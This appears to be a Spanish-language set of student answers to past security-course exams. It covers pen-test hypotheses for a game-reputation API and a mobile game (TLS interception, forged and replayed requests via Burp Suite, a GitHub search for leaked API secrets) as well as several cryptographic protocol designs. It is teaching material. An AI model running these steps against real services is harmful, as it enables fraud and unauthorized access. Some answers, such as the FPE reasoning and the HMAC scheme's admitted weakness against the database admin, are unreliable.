    **Por qué es la más probable:** TLS v1.0 es una versión con vulnerabilidades conocidas (BEAST, POODLE). Un atacante puede interceptar el tráfico entre los juegos y la API de Honoris, y extraer el API Secret que viaja en los headers. Con ese API Secret, el atacante puede hacer requests directamente a la API de Honoris haciéndose pasar por un juego legítimo y notificar hitos falsos para cualquier jugador, inflando su reputación.  
    **Qué esperaría encontrar:** API Secrets de juegos legítimos siendo usados desde IPs que no corresponden a los servidores de esos juegos. Múltiples hitos reportados en ráfagas que no coinciden con patrones normales de juego.  
    **Prueba:** Configurar un proxy (Wireshark) en la red y capturar el tráfico entre un juego y la API. Intentar descifrar el tráfico TLS v1.0 utilizando herramientas que explotan las vulnerabilidades conocidas de esa versión. Si se logra extraer el API Secret del header, la hipótesis se confirma. Luego, usar ese API Secret para enviar un request de notificación de hito falso y verificar si la API lo acepta.
    
4. **Hipótesis 2: Falta de validación en la API → Un juego notifica hitos de otro juego (Broken Access Control)**
    
    **Por qué es probable:** Hay más de 100 juegos integrados, cada uno con su API Secret. Si la API de Honoris solo valida que el API Secret sea válido pero no verifica que el hito notificado corresponda al juego asociado a ese API Secret, un desarrollador de un juego chico puede notificar hitos de un juego con coeficiente alto.
    
    Por ejemplo: el desarrollador del juego "FlappyBird" (coeficiente bajo) usa su API Secret para notificar hitos del juego "WorldOfWarcraft" (coeficiente alto) que valen mucho más. La API acepta porque el API Secret es válido, aunque no corresponda a ese juego.
    
    **Qué esperaría encontrar:** Hitos de juegos con coeficientes altos siendo reportados desde API Secrets de juegos distintos.
    
    **Prueba:** Con el API Secret de un juego de prueba, intentar notificar un hito que pertenece a otro juego: `POST /api/hitos { "juego": "otro_juego", "hito": "hito_ajeno", "jugador": "test" }`. Si la API lo acepta sin verificar que el hito corresponda al juego del API Secret, la hipótesis se confirma.
    
5. **Hipótesis 3: Broken Access Control entre roles → Admin de juego escala privilegios**
    
    **Por qué es probable:** Hay dos tipos de administradores: los de cada juego (definen hitos) y los de Honoris (definen coeficientes). Si la API o el panel no diferencian correctamente estos roles, un administrador de un juego podría acceder a funcionalidades de administrador de Honoris, como modificar el coeficiente de su propio juego para multiplicar la puntuación de sus hitos.
    
    **Qué esperaría encontrar:** Coeficientes modificados recientemente sin registro de un admin de Honoris haciéndolo, o un admin de juego accediendo a endpoints de admin de Honoris.
    
    **Prueba:** Con credenciales de administrador de un juego, intentar acceder a endpoints de administración de Honoris: `PUT /api/admin/juegos/{id}/coeficiente` con un valor alto. Si el servidor acepta la modificación en vez de devolver 403, la hipótesis se confirma.
    
6. **Hipótesis 4 (menos probable): API Secret en logs o código fuente público**
    
    **Por qué es posible:** Con más de 100 juegos integrados, es probable que algún desarrollador haya cometido un error y publicado su API Secret en un repositorio público (GitHub), en logs accesibles, o en el código del cliente. Un atacante que encuentra ese API Secret puede usarlo para notificar hitos falsos.
    
    **Qué esperaría encontrar:** API Secrets de juegos apareciendo en repositorios públicos de GitHub, en logs de servidores accesibles, o en código JavaScript del frontend de algún juego.
    
    **Prueba:** Buscar en GitHub: `"honoris" AND "api_secret"` o `"honoris" AND "X-API-Key"`. Revisar el código fuente del frontend de algunos juegos integrados buscando API Secrets hardcodeados. Si se encuentra alguno, verificar si sigue siendo válido haciendo un request de prueba a la API.
    

---

# 07-10-2018

## Ejercicio 1

Sistema de broadcast de emergencias.  
El gobierno de _Deponia_ está pensando en instalar un sistema de comunicaciones que le permita anunciar a sus ciudadanos instrucciones de evacuación en casos de emergencia.  
Como cada tipo de emergencia (terremotos, marejadas, contaminación tóxica, _Rufus_, radiactividad, etc.) tiene un departamento diferente responsable de la respuesta ante incidentes no es posible implementar un mecanismo centralizado de comunicaciones, pero es de vital importancia que la información llegue a todos los habitantes y que dicha información no sea falsa.  
El departamento de tecnología preparó el sistema que sigue los siguientes lineamientos:

- Cada depto tendrá un dispositivo emisor
- Se instalará una red de repetidores por todas las ciudades
- Se instalarán receptores en lugares clave, donde serán publicadas las noticias para que todo el mundo pueda verlas
- Para llegar a un receptor de un emisor, las comunicaciones pasan por uno o más repetidores y la transmisión es desde un emisor a todos los receptores, unidireccional
- Los emisores y receptores pueden ser reconfigurados, pero los repetidores, por su cantidad y dispersión, solo serán reemplazadas ante desperfectos
- Los repetidores pueden ser robados y analizados, pero eso no deberá comprometer la seguridad de la solución

1. Utilizando solo criptografía simétrica, explicar cómo se debería realizar la comunicación entre los distintos dispositivos para que un mensaje llegue a los receptores, garantizando las propiedades necesarias (y solo ellas, no queremos diseñar un producto mucho más caro que agregue propiedades que no son necesarias)
    
    `Emisor (departamento) → Repetidores → Receptores (pantallas públicas)`
    
    |Múltiples deptos, no centralizado|Cada emisor/depto debe poder identificarse únicamente|
    |---|---|
    |“Información no sea falsa”|Integridad|
    |Repetidores pueden ser robados y analizados|Lo que sea que tenga el repetidor, el atacante lo conoce → no puede haber secretos en repetidores|
    |Emisores y receptores pueden ser reconfigurados|Pueden recibir claves nuevas, actualizaciones|
    |Repetidores solo se reemplazan ante desperfectos|No se pueden actualizar fácilmente|
    |Unidireccional|No hay challenge-response posible|
    
    Criptografía simétrica: una key que todas comparten
    
    En un principio, emisores reciben sus claves y los receptores guardan en una tabla el par [emisor_id→k_i] la cual es la misma que tienen los emisores (criptografía simétrica). Como no hay una central que comparte estas claves, se presupone que la etapa de configuración se realiza de forma manual y 100% segura.
    
    1. Emisor → Repetidor: {tipo_emergencia || emisor_id || T || MAC_k_i{tipo_emergencia || emisor_id || T}
        1. Los repetidores únicamente reciben este mensaje y lo retransmiten
    2. Repetidor → Receptor: {tipo_emergencia || emisor_id || T || MAC_k{tipo_emergencia || emisor_id || T}
        1. Receptor debe verificar integridad del emisor y que la información no haya sido adulterada por algún repetidor
        2. Debe conocer la clave simétrica (k) de antemano la cual obtiene a partir del emisor_id
        3. Verifica que el emisor_id y T sean válidos
        4. Luego calcula Vrfy{MAC_k(tipo_emergencia||emisor_id||T}, {tipo_emergencia || emisor_id || T}} para verificar la integridad del mensaje
        5. Una vez que es confirmada esta integridad, muestra en la pantalla
        6. Si es los repetidores modifican el tipo_emergencia (o cualquier otro campo) la MAC será invalidada y el mensaje no se mostrará en las pantallas
        7. El T sirve para evitar ataques de replay
2. ¿Cómo modificaría el sistema para que sin perder las propiedades conseguidas, pueda autodiagnosticarse y determinar qué repetidores dejan de funcionar, sin que dicho diagnóstico sea falsificable?
    
    Como la comunicación es unidireccional en el sentidor emisor→receptor, lo que se puede hacer es que los emisores envíen su “heartbeat” que debe pasar por todos los receptores. Además, es importante destacar que los receptores no pueden tener una clave guardada pues el enunciado dice que los repetidores pueden ser robados y analizados.
    
    Los emisores envían periódicamente (por ejemplo, cada 30 segundos) un mensaje de heartbeat que atraviesa toda la cadena de repetidores:
    
    `Emisor_i → Repetidores → Receptores: emisor_id || "HEARTBEAT" || T || ruta_esperada || MAC_{k_i}(emisor_id || "HEARTBEAT" || T || ruta_esperada)`
    
    Donde `ruta_esperada` identifica por qué cadena de repetidores debería pasar este heartbeat (ya que los emisores conocen la topología de la red).
    
    **¿Cómo funciona el diagnóstico?**
    
    Cada receptor sabe qué heartbeats debería recibir y por qué rutas. Si un receptor deja de recibir heartbeats que deberían pasar por el repetidor R5, pero sigue recibiendo los que pasan por otras rutas, puede inferir que R5 dejó de funcionar.
    
    `Receptor:
    
    - Esperaba heartbeat de Emisor_1 vía ruta [R1 → R3 → R5] cada 30s
    - No lo recibió en los últimos 2 minutos
    - Sí recibe heartbeats vía ruta [R1 → R2 → R4]
    - Conclusión: algún repetidor en la ruta R1→R3→R5 falló
    - Cruza con otras rutas que pasan por R3 y R5 individualmente
    - Si rutas por R3 funcionan pero rutas por R5 no → R5 está caído`
    
    **¿Por qué no es falsificable?**
    
    - Los heartbeats están firmados con MAC_{k_i} del emisor → un atacante no puede fabricar heartbeats falsos
    - Un atacante que roba un repetidor puede dejar de retransmitir (DoS), pero no puede fabricar heartbeats que digan "estoy bien" porque no tiene las claves de los emisores
    - La detección está en los receptores (que sí tienen claves y pueden verificar), no en los repetidores
    
    **¿Qué pasa si un repetidor robado retransmite selectivamente?**
    
    Si el atacante solo bloquea algunos mensajes pero deja pasar otros, los receptores detectarán inconsistencias: algunos heartbeats llegan y otros no por la misma ruta. Esto también es una señal de que el repetidor está comprometido.
    

## Ejercicio 2

Existe un tipo de criptosistema denominado Format Preserving Encryption (FPE).  
La idea de este tipo de criptosistemas es que: `P=C={0,1,...,N}` para un N arbitrario. Esto permite, que el texto plano y cifrado sean del mismo tipo, propiedad muy útil para cifrar datos sin modificar la forma en la que se almacenan o transmiten.  
Por ejemplo, se podría cifrar un número de tarjeta de crédito, de tal forma que el resultado sea otro número de tarjeta, o un número de _x_ dígitos, de tal forma que el resultado sea otro número de esa misma cantidad de dígitos.  
Además de criptosistemas específicos de este tipo, hay formas de convertir un criptosistema de bloque en un FPE. Una de ellas funciona de la siguiente manera:

Sea $E_k(x)$ una primitiva de cifrado en bloque de tamaño _n_. Se define $FPE_k(x)$, primitiva de cifrado con $P=C=\{0,1,...,m-1\} / m<2^n$ a través del siguiente pseudocódigo:

$$  
\text{FPE}_k(x)=\text{si } E_k(x) < m \rarr E_k(x) \newline  
\text{sino } \rarr \text{FPE}_k(E_k(x))  
$$

1. Explicar por qué esta transformación es segura si la primitiva de cifrado es segura.
    
2. **Si utilizase este tipo de función para cifrar números de tarjeta de crédito de 12 dígitos (~53 bits), ¿Sería más seguro utilizar una primitiva que cifra de a bloques de 64 bits, o una que cifra de a bloques de 128 bits, si ambas primitivas usan claves de 128 bits? (1 pto.)**
    
    Ambas primitivas tienen la misma seguridad contra fuerza bruta de la clave (2^128 en ambos casos, ya que ambas usan claves de 128 bits).
    
    La diferencia está en la seguridad del FPE en sí. La seguridad de un cifrado en bloque como permutación pseudoaleatoria se degrada con el uso, y esa degradación depende del tamaño del bloque, no de la clave. Con bloques de 64 bits, el espacio es 2^64 y las colisiones (ataques de cumpleaños) aparecen alrededor de 2^32 mensajes cifrados. Con bloques de 128 bits, las colisiones aparecen recién en 2^64 mensajes.
    
    Además, para el FPE, el bloque de 64 bits (2^64 ≈ 1.8 × 10^19) está mucho más cerca del espacio de tarjetas (10^12 ≈ 2^53) que el bloque de 128 bits. Esto significa que con bloques de 64 bits, la probabilidad de que E_k(x) caiga en el rango válido es mayor (m/2^n = 2^53/2^64 ≈ 1/2^11), y el algoritmo termina en pocas iteraciones. Pero lo importante para la seguridad: cuanto más chico es el espacio del bloque respecto al espacio de tarjetas, menos "mezcla" hay, y un atacante tiene menos combinaciones que analizar.
    
    **Es más seguro usar la primitiva de 128 bits** porque tiene un espacio de bloque más grande, lo cual da más margen de seguridad contra ataques de cumpleaños y contra análisis estadístico de la permutación.
    
3. Siguiendo con las alternativas del ejercicio anterior, ¿cuál de los criptosistemas sería más práctico de utilizar? ¿Por qué? (0.5 ptos.)
    
    La primitiva de **64 bits sería más práctica**.
    
    Con bloques de 64 bits, la probabilidad de caer en el rango válido en cada iteración es:
    
    `m / 2^n = 2^53 / 2^64 = 1/2^11 ≈ 1/2048`
    
    Esto significa que en promedio se necesitan ~2048 iteraciones de E_k para obtener un resultado válido.
    
    Con bloques de 128 bits:
    
    `m / 2^n = 2^53 / 2^128 = 1/2^75`
    
    Esto es una probabilidad ínfima — se necesitarían en promedio 2^75 iteraciones para que el resultado caiga en el rango de 12 dígitos. Eso es computacionalmente inviable en la práctica.
    
    Por lo tanto, la de 64 bits es mucho más práctica porque el algoritmo de FPE termina en un número razonable de iteraciones, mientras que con 128 bits es inutilizable por la cantidad astronómica de iteraciones necesarias.
    

## Ejercicio 3

La empresa _Mundos Imaginarios_ está trabajando en las etapas finales de un juego multijugador para smartphones, donde los usuarios trabajarán colaborativamente para terraformar (modificar atmósfera, temperatura, clima, flora y fauna para recrear un ecosistema similar al de la tierra) planetas con distintas condiciones iniciales.

El proceso duraría entre una semana y dos meses en tiempo real, dependiendo de la cantidad de jugadores y las habilidades que cada uno posea. Los usuarios no interactúan entre sí. Solo pueden ver el efecto global producido por el resto, y decidir en qué tarea van a participar (cada tarea mejora algunos indicadores y daña otros - el objetivo es lograr cierto equilibrio entre todos sin comunicación directa).

Los mundos se generan en **servidores**, y luego **copiado a las aplicaciones** por un tema de eficiencia en uso de datos.

Cada **teléfono se sincroniza con el servidor 1 vez por hora si el jugador no hizo nada**, o **inmediatamente** cuando se confirma algún cambio en las tareas que decide hacer cada usuario. Con esa información el servidor actualiza los indicadores globales, que le envía a cada teléfono durante la sincronización.

Luego del primer mes de su lanzamiento, hay una tasa alta de juegos que fueron terminados en 1 o 2 días, cosa que es imposible, a menos que alguien haya hecho trampa.

Para solucionar esto y mantener la idea original del juego, se contrata un servicio de análisis de seguridad.

a) Con la información conocida, establecer 4 hipótesis plausibles, ordenadas de la más probable a la menos probable, que haya que revisar para encontrar el/los problemas. Explicar por qué considera que cada hipótesis es altamente probable y qué esperaría encontrar. (2 ptos.)

b) Explicar cómo probaría las dos hipótesis más probables siguiendo la metodología de un pen-test (1 pto.)

```jsx
1. Servidor -> Telefono: mundo se genera en el servidor y se copia en el telefono (setup original) 
2. Telefono -> Servidor: 
- jugador elige tarea -> sincroniza con servidor 
- jugador no hizo nada -> cada 1 hora telefono envia heartbeat
3. Servidor actualiza indicadores
4. Servidor -> TelefonoS (otros): indicadores actualizados 
```

- mundo copiado localmente en telefono → alguien puede modificar datos locales
- sincronizacion → servidor valida lo que recibe del telefono?
- si alguien envia muchas tareas en poco tiempo → DoS

**Hipótesis 1: Manipulación de datos locales en el teléfono**  
El mundo se copia localmente al teléfono. Si los datos del estado del juego (indicadores, progreso, tareas completadas) se almacenan sin protección de integridad, un jugador puede modificarlos directamente con herramientas de **root**/**jailbreak**. Podría cambiar los indicadores locales para que reflejen un planeta ya terraformado, y al sincronizar, el servidor acepta esos valores como legítimos.  
Esperaría encontrar: archivos SQLite, SharedPreferences o JSON en el almacenamiento local de la app sin cifrar ni firmar, modificables con un editor de texto.

**Hipótesis 2: Falta de validación server-side de las tareas enviadas**

Cuando el teléfono sincroniza con el servidor y envía "el jugador eligió la tarea X", el servidor probablemente actualiza los indicadores sin validar si esa tarea es coherente. Un atacante con **proxy** (Burp Suite) puede **interceptar el request de sincronización y modificar los datos**: enviar tareas que no eligió, enviar múltiples tareas a la vez, enviar tareas con efectos exagerados, o enviar tareas que su personaje no debería poder hacer según sus habilidades.

Esperaría encontrar: el servidor acepta cualquier tarea que le envíen sin verificar habilidades del jugador, cooldowns, ni límites.

**Hipótesis 3: Replay / automatización de sincronizaciones**

La sincronización ocurre inmediatamente cuando hay un cambio. Si no hay rate limiting ni validación temporal, un atacante puede automatizar requests de sincronización enviando cientos de "completé tarea X" por minuto. Si el servidor no verifica que hay un tiempo mínimo entre tareas, un bot puede completar en minutos lo que un humano tarda días.

Esperaría encontrar: el servidor acepta múltiples requests de sincronización en ráfaga sin limitar la frecuencia, y no valida el timestamp de cuándo se realizó la tarea versus cuándo se envió.

**Hipótesis 4: Falta de certificate pinning → MITM para modificar respuestas del servidor**

Es una app móvil que se comunica con un servidor. Si no hay certificate pinning, un atacante puede interceptar las respuestas del servidor (los indicadores globales) y modificarlas antes de que lleguen a la app. Podría hacer que la app crea que el planeta ya está casi terraformado, y enviar la última tarea para "completar" el juego.

Esperaría encontrar: la app acepta certificados de proxy sin rechazarlos, permitiendo modificar los indicadores globales en tránsito.

### Pruebas para las dos más probables

**Prueba H1 (Falta de validación server-side):**

Instalar un proxy (Burp Suite) en un emulador. Iniciar el juego, elegir una tarea legítima e interceptar el request de sincronización. Examinar la estructura del request (probablemente JSON con tarea_id, efectos, jugador_id). Modificar los valores antes de que lleguen al servidor: cambiar la tarea por una de mayor efecto, multiplicar los indicadores, o enviar una tarea que las habilidades del jugador no permiten. Si el servidor acepta y actualiza los indicadores globales con los valores modificados, la hipótesis se confirma.

**Prueba H2 (Replay / automatización):**

Con el proxy activo, capturar un request de sincronización legítimo (completar una tarea). Reenviar ese mismo request 100 veces en un minuto usando el repeater de Burp Suite. Verificar si el servidor acepta todos los requests y actualiza los indicadores cada vez, o si detecta que es un replay/ráfaga y los rechaza. Si acepta todos, un bot puede automatizar esto y terminar el juego en horas.

# 13-02-2017

## Ejercicio 1

La empresa Tecnosalud S.A. está desarrollando un chip que se puede alojar dentro del cuerpo de una persona y permite almacenar su historia clínica, para poder brindar un mejor tratamiento en caso de ocurrir algún accidente. Como dicha información varía a lo largo del tiempo el chip debe permitir la modificación de datos luego de su instalación.  
Tras realizar un modelado de amenazas, se decide:

- Que el chip mantenga separada información inmutable (como nombre, fecha de nacimiento, grupo sanguíneo), información de contacto (nombre de contacto, teléfono, email, etc), e información médica. El primer grupo de información no podrá ser modificada; el segundo sí; y en el tercero solo se permitirá agregar información nueva.
- Que la información deberá estar cifrada de alguna manera.
- Que, sin un dispositivo autorizado, no será posible leer la información.
- Que, si un dispositivo es robado, deberá poder inutilizarse el uso del mismo.
- Que la información esté almacenada en el chip y nunca viaje a servidores donde sea almacenada de forma centralizada.

Para ello se decide desarrollar un sistema con un controlador online que arbitre el acceso a la información de los dispositivos:

- Cada chip y cada lector tendrá un número de serie y una clave simétrica asociada. La clave es única por chip.
- El comando central (controlador) posee una base de datos con todos los números de serie y su clave asociada.
- Cuando un dispositivo quiere acceder a la información del chip, consigue su número de serie (utilizando un protocolo similar a RFID –los chips informan públicamente su número de serie), y solicita permiso para leerlo al comando central.
- El permiso, si es concedido, consiste en un token que representa una capacidad que el comando central otorga al dispositivo. Con esa capacidad, el dispositivo puede obtener del chip la información que solicita, o actualizar/agregar información nueva (algunos dispositivos solo pueden leer, otros también actualizar información).
- Solo los dispositivos pueden comunicarse con el comando central. Los chips solo se conectan a corta distancia física.

1. Describir un posible protocolo enumerando los mensajes que intercambiarían CH (chip), DS (dispositivo) y CC (comando central), para que el segundo acceda a información del primero, y que debería hacer/verificar cada parte.(1 punto).
    
    La idea es que el DS le pregunte por el token de un cierto chip a la CC. Para ello, un protocolo como el de Denning-Sacco podria funcionar.
    
    1. CH → DS: #serie_chip (broadcast público tipo RFID)
        
    2. DS → CC: {#serie_DS || #serie_CH || permisos_solicitados || r1}
        
        CC verifica:
        
        - que #serie_DS corresponda a un dispositivo registrado y no esté inutilizado
        - que #serie_chip corresponda a un chip registrado
        - que los permisos solicitados sean compatibles con el tipo de dispositivo (si es solo lectura, no otorga escritura)
        - Genera una clave de sesión k_s para la comunicación DS↔CH
    3. CC → DS: {#serie_DS || r1 || k_s || permisos_otorgados || {#serie_DS || k_s || Timestamp || permisos_otorgados }_k_CH}_k_DS
        
        - r1: para que el DS verifique que es respuesta a su solicitud (anti-replay)
        - k_s: clave de sesión para comunicarse con el chip
        - El token para el chip: `{ #serie_DS || k_s || permisos_otorgados || timestamp }_k_CH`
    4. DS → CH: {#serie_DS || k_s || Timestamp || permisos_otorgados }_k_CH
        
        **Verificación del CH:**
        
        - Descifra con k_CH (solo él y el CC la conocen → sabe que vino del CC)
        - Verifica que el timestamp sea reciente (anti-replay)
        - Verifica que los permisos sean válidos (lectura, escritura, agregar)
        - Obtiene k_s para comunicarse con el DS
    5. CH → DS: {datos}_k_s
        
        El chip cifra la información con k_s y se la envía al DS. El DS la descifra con k_s. La información nunca pasa por el CC (cumple el requisito de no almacenamiento centralizado).
        
2. Explicar cómo ocurriría en el protocolo anterior que un dispositivo robado no siga accediendo indefinidamente a información de chips. ¿Es posible evitar que vuelva a leer chips para los cuales ya había recibido permiso anteriormente? (1 punto).
    
    **1. Para tokens ya otorgados — Timestamp (expiración):**
    
    El token que recibe el chip incluye un timestamp. El chip verifica que el timestamp sea reciente (dentro de una ventana de pocos minutos). Si el dispositivo robado intenta reutilizar un token viejo después de que la ventana expiró, el chip lo rechaza. Esto limita la ventana de ataque a los tokens que el dispositivo ya tenía al momento del robo.
    
    **2. Para nuevos tokens — Blacklist en el CC:**
    
    Cuando se reporta el robo de un dispositivo, el CC lo marca como inutilizado en su base de datos (blacklist). A partir de ese momento, cuando el dispositivo robado intente solicitar nuevos tokens (`DS → CC: #serie_DS || #serie_chip || ...`), el CC verifica el #serie_DS contra la blacklist, detecta que está inutilizado, y rechaza la solicitud. Sin token nuevo, el dispositivo no puede acceder a ningún chip.
    
    **¿Es posible evitar que lea chips para los cuales ya tenía permiso?**
    
    Parcialmente. Si el dispositivo ya recibió un token válido antes del reporte de robo, puede usarlo hasta que expire (el chip no tiene conexión al CC para saber que fue revocado). Por eso es importante que la ventana de validez del timestamp sea corta: cuanto más corta, menor es la ventana en la que un token pre-existente sigue siendo útil. Una vez expirado, el dispositivo necesita un token nuevo, y el CC ya no se lo otorga.
    
    La limitación es que el chip es offline (solo se conecta a corta distancia física, no al CC), así que no puede consultar la blacklist en tiempo real. El timestamp es el único mecanismo que tiene el chip para invalidar tokens.
    
3. Explicar por qué no es posible que alguien simule ser un dispositivo y acceda a la información del chip. (1 punto).
    
    **1. El CC rechaza dispositivos no registrados:**
    
    Para solicitar un token, el atacante necesita enviar un #serie_DS válido. Si inventa un número de serie que no existe en la BD del CC, el CC rechaza la solicitud directamente. Sin token, no puede acceder a ningún chip.
    
    **2. Sin k_DS no puede descifrar la respuesta:**
    
    Si el atacante intenta hacerse pasar por un dispositivo legítimo usando su #serie_DS (por ejemplo, porque lo vio impreso en algún lado), el CC respondería cifrando el token con k_DS, la clave simétrica de ese dispositivo. El atacante no conoce k_DS (es un secreto compartido únicamente entre el dispositivo legítimo y el CC), por lo tanto no puede descifrar la respuesta y no obtiene ni la clave de sesión k_s ni el token para presentar al chip.
    
    Incluso si el atacante interceptara el mensaje cifrado en tránsito, sin k_DS no puede extraer nada útil de él.
    
4. Explicar por qué el protocolo no puede ser offline. ¿Qué requerimiento no puede cumplirse si el protocolo no contase con un comando central? (1 punto).
    
    Sin un comando central, no se pueden cumplir dos requisitos clave:
    
    **1. Control de autorización de dispositivos:**
    
    El CC es quien verifica que un dispositivo esté registrado y determina qué permisos tiene (solo lectura, o también escritura/agregar). Sin el CC, el chip tendría que decidir por sí mismo si un dispositivo es legítimo o no. Pero el chip no tiene una base de datos de dispositivos autorizados (no tiene capacidad de almacenamiento para eso, ni forma de mantenerla actualizada). El CC centraliza esa responsabilidad: conoce todos los dispositivos, sus números de serie, sus claves, y sus permisos.
    
    **2. Inutilización de dispositivos robados:**
    
    Este es el requisito que hace imposible el modo offline. Si un dispositivo es robado, el CC puede marcarlo como inutilizado en su BD y rechazar futuras solicitudes de token. Sin un CC, no hay forma de revocar el acceso de un dispositivo. El chip es offline por naturaleza (solo se comunica a corta distancia), no tiene conexión a ningún servidor para consultar una blacklist. Si el chip tuviera que decidir solo, un dispositivo robado podría seguir accediendo indefinidamente porque nadie le avisa al chip que ese dispositivo ya no es válido.
    
    **En resumen:** el CC es necesario porque actúa como árbitro centralizado de permisos y revocación. Sin él, no hay forma de inutilizar dispositivos robados, que es un requisito explícito del sistema.
    

## Ejercicio 2

Una importante cadena de supermercados decidió construir su propio sistema de puntos de venta, que corre en todas las cajas de todas sus sucursales, y está integrado a los sistemas de stock y contabilidad.  
El sistema está compuesto por una aplicación nativa que corre en una distribución de Linux modificada para actuar como un Kiosk (al iniciarse se ejecuta la aplicación desarrollada y no hay forma de ejecutar otras aplicaciones), un servicio REST expuesto en la red interna que expone la funcionalidad del sistema, y que utiliza una base de datos PostgreSQL y otros microservicios para completar su funcionamiento.  
Para utilizar la aplicación, cada cajero dispone de una tarjeta, que al ser pasada por un lector se convierte en un número de serie, y debe ingresar un pin numérico de 8 dígitos que sólo él conoce. El servicio expone un recurso a fin de iniciar sesiones: POST /session, que recibe como mensaje un document JSON con el siguiente formato:

```jsx
{
	"user": "<número de serie>",
	"credentials": "<información de autenticación>"
}
```

y retorna un identificador para la nueva sesión o un error si algo falló. Adicionalmente, en la intranet no está permitido el uso de HTTPs por temas de balance de carga y auditoría, así que la llamada al recurso se realizará utilizando HTTP sin seguridad adicional.  
A partir de una sesión de modelado de amenazas, se determinó que los dos ataques más peligrosos, y contra los cuales la solución debe ser segura, son:

- El administrador de las bases de datos quiere impersonar a un cajero.
- El administrador de red (que puede capturar mensajes) quiere impersonar a un cajero.

1. Definir cómo implementaría el servicio de autenticación, explicitando como mínimo (1 punto):
    
    1. Cómo guardaría en la base de datos la información que permita autenticar a los usuarios.
    2. Cómo quedaría conformado el valor de “credentials” en el mensaje del servicio.
    3. Cómo utilizaría la información recibida y la almacenada para autenticar al cajero.
    
    Para que el admin de la BD no pueda impersonar a un cajero: los datos que se guardan en la BD deben estar hasheados
    
    Para que el admin de red no pueda impersonar a un cajero: los datos que se envian por la red (in-transit data) deben mantenerse confidencial (no se puede enviar en claro)
    
    - En la BD se deberia guardar: hash(numero de serie) — hash(PIN 8 digitos)
        - Hay un problema: como el pin es solo de 8 digitos, un hash capaz no sea lo suficientemente fuerte para la confidencialidad del PIN. Entonces capaz agregar un NONCE que sea el numero de serie?
        - Cuando el cajero pasa la tarjeta y se convierte en un numero de serie e ingresa el PIN de 8 digitos, la app debe fijarse que el hash del numero de serie y del pin coinciden con los hashes almacenados en la BD (o se puede guardar un hash de numero de serie || pin)
    - El mensaje JSON que se envia para el POST de /session va en claro entonces cualquiera con acceso a la intranet podria ver el “user” y “credentials” por lo tanto, o hay que hashear ambos datos o asegurar que solo se vean en http-only o hay algun campo que se pueda utilizar para que no se puedan ver los datos aunque sea HTTP la conexion?
    - credentials seria el pin de 8 digitos(?) no entiendo que tipo de informacion de autenticacion: tipo nombre, edad etc?
    - para autenticar al cajero:
        - primero me (la app) fijo que el numero de serie existe en la bd y es legitimo - no esta blacklisted, el cajero sigue trabajando, etc.
        - luego ver si el numero de serie y el pin asociado van de la mano
            - enc_pin(numero_de_serie) → si trato de desencriptar el numero de serie con el pin y luego veo si el hash del numero de serie coincide? pero la key = pin es muy chico
2. Explicar por qué el sistema resultante es inmune a los escenarios de ataque mencionados. (3 puntos)
    

---

### a) Qué se guarda en la base de datos

Para cada cajero se almacena:

`numero_de_serie | salt | bcrypt(salt || PIN)`

- El número de serie es el identificador del usuario (público)
- El salt es aleatorio y único por cajero
- Se usa bcrypt (función de hash lenta) o **PBKDF2** porque el PIN es de solo 8 dígitos numéricos (10^8 combinaciones). Con un hash rápido como SHA-256, un atacante recorrería todo el espacio en segundos. bcrypt es lenta por diseño (~100ms por intento), haciendo la fuerza bruta inviable

### b) Protocolo de autenticación (challenge-response)

**Paso 1 — Solicitud de challenge:**

```jsx
App → Servidor: GET /challenge?user=#serie
Servidor → App: { "nonce": "<aleatorio>", "salt": "<salt_del_usuario>" }
```

El servidor genera un nonce aleatorio de uso único y lo guarda asociado al usuario. También envía el salt para que la app pueda calcular el hash.

**Paso 2 — Envío de credenciales:**

```jsx
App → Servidor: POST /session
{
  "user": "<numero_de_serie>",
  "credentials": "HMAC_{bcrypt(salt || PIN)}(nonce)"
}
```

La app calcula localmente `bcrypt(salt || PIN)` usando el salt recibido y el PIN que ingresó el cajero. Luego usa ese hash como clave para calcular un HMAC sobre el nonce. Envía solo el HMAC como credentials, nunca el PIN ni el hash.

### c) Cómo autentica el servidor al cajero

1. Recibe el `user` (#serie) y el `credentials` (HMAC)
2. Busca en la BD el `bcrypt(salt || PIN)` almacenado para ese número de serie
3. Recupera el nonce que había guardado para ese usuario
4. Calcula por su cuenta: `HMAC_{bcrypt_almacenado}(nonce)`
5. Compara el HMAC calculado con el recibido en credentials
6. Si coinciden → autenticación exitosa, crea sesión y retorna el identificador
7. Si no coinciden → retorna error
8. En ambos casos, invalida el nonce (uso único, no se puede reutilizar)

---

## Punto 2: Por qué es inmune a los dos ataques

### Contra el administrador de la base de datos

El admin de BD ve: `numero_de_serie`, `salt`, y `bcrypt(salt || PIN)`.

**No puede recuperar el PIN** porque bcrypt no es invertible. Para obtenerlo tendría que hacer fuerza bruta: probar los 10^8 PINes posibles calculando `bcrypt(salt || intento)` para cada uno. Pero bcrypt es lenta por diseño — a ~100ms por intento, recorrer 10^8 combinaciones tomaría del orden de meses.

**No puede impersonar al cajero** porque para responder un challenge necesita calcular `HMAC_{bcrypt(salt || PIN)}(nonce)`. Ya tiene el hash bcrypt almacenado... pero eso es exactamente la clave del HMAC. ¿Entonces puede calcular el HMAC?

Sí podría, y por eso se necesita una protección adicional: el admin de BD no tiene acceso a la red (es un atacante de BD, no de red). Su ataque es intentar obtener el PIN para ir físicamente a una caja y hacerse pasar por un cajero. Y eso no puede porque bcrypt es lenta y el PIN no es recuperable en tiempo razonable.

### Contra el administrador de red

El admin de red captura el tráfico HTTP en claro y ve:

**En el challenge:** `nonce` y `salt` (ambos públicos, no son secretos)

**En el POST /session:**

- `user`: número de serie (público)
- `credentials`: `HMAC_{bcrypt(salt || PIN)}(nonce)`

**No puede hacer replay** porque el nonce es de uso único. Si reenvía el mismo mensaje, el servidor ya invalidó ese nonce y rechaza la solicitud.

**No puede extraer el PIN** porque solo ve el HMAC, que no es invertible. No puede obtener ni el PIN ni `bcrypt(salt || PIN)` a partir del HMAC.

**No puede fabricar un HMAC para un nonce nuevo** porque necesitaría `bcrypt(salt || PIN)` como clave del HMAC, y eso nunca viaja por la red. La app lo calcula localmente y lo usa solo como clave del HMAC sin enviarlo.

**No puede hacer fuerza bruta sobre el HMAC** porque tendría que calcular `bcrypt(salt || intento)` para cada PIN candidato (para obtener la clave del HMAC y verificar si produce el mismo resultado). Nuevamente, bcrypt es lenta y los 10^8 intentos tardarían meses.

## Ejercicio 3

Cuando se necesita verificar parcialmente la integridad de un conjunto de datos, obtener el hash de todo el mensaje es ineficiente. Considerar, por ejemplo, un mensaje de 1TB de tamaño, en donde interesa verificar la integridad de un bloque de 1MB.  
